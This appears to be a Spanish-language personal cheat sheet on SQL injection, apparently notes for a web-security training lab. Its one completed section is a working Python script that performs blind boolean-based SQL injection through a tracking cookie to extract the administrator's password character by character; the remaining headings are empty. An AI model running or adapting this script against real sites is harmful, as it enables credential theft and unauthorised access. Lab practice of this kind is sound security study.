---
title: SQL INJECION - SQLI CHEAT SHEET
published: true
---

- SQL INJECTION

SCRIPTS QUE SIRVEN DE GUIA PARA LOS DIFERENTES TIPOS DE SQLI DE TIPOS

- CONDITIONAL REPONSE

```python
#!/usr/bin/python3
from pwn import *
import requests,signal ,time,pdb,sys,string

def def_handler(sig,frame):
   print("\n\n [!] Saliendo... \n")
   sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT,def_handler)

main_url = "https://0a8d00e8034e08e980bcd096007a0046.web-security-academy.net/filter?category=Accessories"

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits # caracteres lower case  + upper cas + numeros

def make_requests():
   password = ""

   p1 = log.progress("Fuerza bruta") # nombre la barra de progreso

   p2 = log.progress("password") # nombre de la 2 barra de progreso


   for posicion in range(1,21): #tamaño de la contraseña es 20 longitud
      for character in characters:
         #COOKIES VULNERABLES A SQL INJECTION
         cookies = {
         'TrackingId' : "aI7htw8h5K5p9nsH'  and (select substring(password,%d,1) from users  where username='administrator')='%s" % (posicion,character),
         'session': '0KWmmHJMHEayvKEXiNqiRKo7cikxvyJ7'
         }

         p1.status(cookies['TrackingId']) # resultado de la barra de progreso

         r = requests.get(main_url,cookies=cookies) # respuesta de la peticion se almacena en r

         #si en la respuesta es presente la palabra que es el que indica si fue existoso o no 
         #!!! IMPORTANTE !!! TIENEN OTROS METODOS COMO : r.status_code , r.headers , r.cookies , r.text , r.json() , r.url
         if "Welcome back!" in r.text: 
            password += character
            p2.status(password) # resultado de la 2 barra  de progreso
            break

if __name__ == '__main__':
   make_requests()

```

- CONDITIONAL ERRORS

- CONDITIONAL VISIBLE ERROR-BASED

- CONDITIONAL TIME DELAYS

- CONDITIONAL TIME DELAYS AND INFORMATION RETRIEVAL
